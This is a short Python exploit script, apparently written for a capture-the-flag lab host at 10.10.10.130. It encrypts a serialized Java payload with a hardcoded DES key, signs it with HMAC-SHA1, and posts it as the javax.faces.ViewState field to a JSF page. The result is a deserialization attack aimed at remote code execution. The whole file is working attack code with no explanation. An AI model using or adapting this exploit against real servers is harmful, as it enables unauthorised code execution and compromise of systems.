#!/usr/bin/python3
# coding: utf-8

from pwn import *
from hashlib import sha1
from base64 import b64encode, b64decode
import requests
import pyDes
import hmac

def def_handler(sig, frame):
	print("\n\n[!]Saindo...\n\n")
	sys.exit(1)

# Ctrl + C
signal.signal(signal.SIGINT, def_handler)

# Variable_Global
main_url = "http://10.10.10.130:8080/userSubscribe.faces"

def createpayload():

	payload = open("/tmp/payload.ser", "rb").read()

	# print(payload)

	return encrypt_data(payload)

def encrypt_data(payload):

	key = b64decode('SnNGOTg3Ni0=')
	obj = pyDes.des(key, pyDes.ECB, padmode=pyDes.PAD_PKCS5)

	encrypted_data = obj.encrypt(payload)
	hash_value = (hmac.new(key, bytes(encrypted_data), sha1).digest())

	encrypted_view_state = encrypted_data + hash_value

	return b64encode(encrypted_view_state)

def decrypt_viewState(viewstate):
	
	key = b64decode('SnNGOTg3Ni0=')
	viewstate = b64decode(viewstate)

	viewstate += b'\x00\x00\x00\x00'

	obj = pyDes.des(key, pyDes.ECB, padmode=pyDes.PAD_PKCS5)

	view_stateDecript = obj.decrypt(viewstate)

	return view_stateDecript

def exploit():

	viewState = createpayload()

	data_post = {
		'javax.faces.ViewState': viewState
	}

	r = requests.post(main_url, data=data_post)

if __name__ == '__main__':
	
	# print(decrypt_viewState("wHo0wmLu5ceItIi+I7XkEi1GAb4h12WZ894pA+Z4OH7bco2jXEy1RUcOXXNAvTSC70KtDtngjDm0mNzA9qHjYerxo0jW7zu1a6WhnEtXrTblezs7Z7sOU6L5UMg="))

	# print(createpayload())

	exploit()
